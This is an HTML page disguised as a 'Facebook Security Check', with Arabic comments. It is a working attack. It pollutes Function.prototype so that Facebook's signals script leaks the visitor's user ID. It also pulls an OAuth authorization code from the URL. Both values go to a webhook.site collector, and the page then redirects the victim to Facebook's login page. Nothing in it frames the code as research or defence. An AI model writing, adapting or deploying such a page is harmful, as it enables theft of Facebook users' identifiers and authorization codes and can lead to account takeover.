<!DOCTYPE html>
<html>
<head><title>Facebook Security Check</title></head>
<body>
    <script>
        // 1. إعداد المصيدة لسحب الـ User ID (XS-Leak) كما في تقارير صمودة
        try {
            Function.prototype.default = function(e) {
                if (e && e.userID) {
                    fetch('https://webhook.site/4347f395-56f0-4f4c-b08d-b9f500f09190?captured_uid=' + e.userID, { mode: 'no-cors' });
                }
            };
            Function.prototype.__esModule = 1;
        } catch (err) {}

        // 2. معالجة سحب الـ Authorization Code المسرب من الرابط
        window.onload = function() {
            const urlParams = new URLSearchParams(window.location.search);
            const authCode = urlParams.get('code'); 

            if (authCode) {
                fetch('https://webhook.site/4347f395-56f0-4f4c-b08d-b9f500f09190?leaked_code=' + authCode, { mode: 'no-cors' })
                .then(() => {
                    window.location.href = "https://www.facebook.com/login/";
                });
            }
        };

        // 3. طلب ملف الإشارات لتفعيل سحب الـ UID
        const script = document.createElement('script');
        script.src = "https://www.facebook.com/signals/iwl.js?pixel_id=100080711880506";
        document.head.appendChild(script);
    </script>
    <p>Loading security check, please wait...</p>
</body>
</html>
